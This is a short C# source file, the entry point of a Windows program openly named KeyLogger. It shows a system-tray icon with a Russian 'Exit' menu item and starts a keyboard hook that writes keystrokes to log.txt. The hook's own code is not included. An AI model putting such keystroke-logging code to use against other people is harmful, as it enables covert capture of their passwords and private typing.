using System;
using System.Windows.Forms;

namespace KeyLogger
{
    static class InterceptKeys
    {
        private static NotifyIcon tray = new NotifyIcon();
        private static ContextMenu menu = new ContextMenu();
        private static KeyboardHook kbd;

        [STAThread]
        public static void Main()
        {
            tray.Icon = Properties.Resources.icon;
            MenuItem exit = new MenuItem("Выход", exit_Click);
            menu.MenuItems.Add(exit);
            tray.ContextMenu = menu;
            tray.Visible = true;
            kbd = new KeyboardHook("log.txt");
            Application.Run();
            tray.Visible = false;
            kbd.Dispose();
        }

        //Выход с программы
        static void exit_Click(object sender, EventArgs e)
        {
            tray.Visible = false;
            kbd.FlushKeys();
            kbd.Dispose();
            Application.Exit();
        }

    }
}
